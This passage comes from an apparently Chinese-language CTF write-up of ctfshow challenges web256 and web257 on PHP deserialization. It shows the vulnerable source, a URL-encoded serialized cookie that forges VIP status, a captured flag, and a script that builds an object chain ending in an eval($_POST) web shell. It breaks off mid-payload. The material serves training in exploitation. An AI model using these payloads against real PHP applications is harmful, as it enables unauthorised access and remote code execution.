web256</h2>\n<p>开始反序列化</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-02 17:44:47</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-02 19:29:02</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">isVip</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">!==</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"your flag is \"</span><span class=\"token operator\">.</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>              <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip, no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">checkVip</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">vipOneKeyGetFlag</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"no vip,no flag\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>审计代码，发现多了个username和password的判断不相等</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">?</span>username<span class=\"token operator\">=</span>K1nako<span class=\"token operator\">&amp;</span>password<span class=\"token operator\">=</span>b</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>Cookie<span class=\"token punctuation\">:</span>user<span class=\"token operator\">=</span><span class=\"token constant\">O</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A11<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>ctfShowUser<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>A3<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">7</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A8<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>username<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A6<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>K1nako<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A8<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>password<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>b<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bs<span class=\"token operator\">%</span><span class=\"token number\">3</span>A5<span class=\"token operator\">%</span><span class=\"token number\">3</span>A<span class=\"token operator\">%</span><span class=\"token number\">22</span>isVip<span class=\"token operator\">%</span><span class=\"token number\">22</span><span class=\"token operator\">%</span><span class=\"token number\">3</span>Bb<span class=\"token operator\">%</span><span class=\"token number\">3</span>A1<span class=\"token operator\">%</span><span class=\"token number\">3</span>B<span class=\"token operator\">%</span><span class=\"token number\">7</span>D</pre></td></tr></table></figure><pre><code>ctfshow&#123;0dc986f3-5835-4f52-899b-d5dfe4ed448e&#125;\n</code></pre>\n<h2 id=\"web257\"><a class=\"anchor\" href=\"#web257\">#</a> web257</h2>\n<p>开始反序列化</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-12-02 17:44:47</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-12-02 20:33:07</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'info'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">info</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">-></span><span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">info</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$code</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token variable\">$user</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token punctuation\">&#125;</span></span></pre></td></tr></table></figure><figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>代码审计，利用后门类执行指令</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span> </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">ctfShowUser</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'b'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$isVip</span><span class=\"token operator\">=</span><span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$class</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'info'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">backDoor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$u</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">username</span><span class=\"token operator\">===</span><span class=\"token variable\">$u</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">password</span><span class=\"token operator\">===</span><span class=\"token variable\">$p</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token keyword\">class</span><span class=\"token operator\">-></span><span class=\"token function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">info</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'xxxxxx'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">backDoor</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'eval($_POST[K1nako]);'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ctfShowUser</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>payload:</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>?username=a&amp;password=b</pre></td></tr><tr><td 